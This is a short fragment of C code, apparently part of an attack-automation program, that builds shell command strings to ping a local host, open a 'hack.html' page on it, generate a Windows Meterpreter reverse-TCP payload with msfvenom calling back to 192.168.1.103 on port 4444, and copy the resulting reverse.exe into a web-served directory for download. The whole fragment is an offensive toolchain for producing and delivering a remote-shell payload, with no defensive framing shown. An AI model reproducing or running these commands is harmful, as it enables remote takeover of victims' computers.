...
do
      ...
      char str6[100005];
      char str7[100005];
      strcpy(str2,"ping -c 10 192.168.1.103");
      strcpy(str3,"firefox 192.168.1.103/hack.html");
      strcpy(str4,"msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.103 LPORT=4444 -f exe > reverse.exe");
      strcpy(str5,"sudo cp reverse.exe /srv/http");
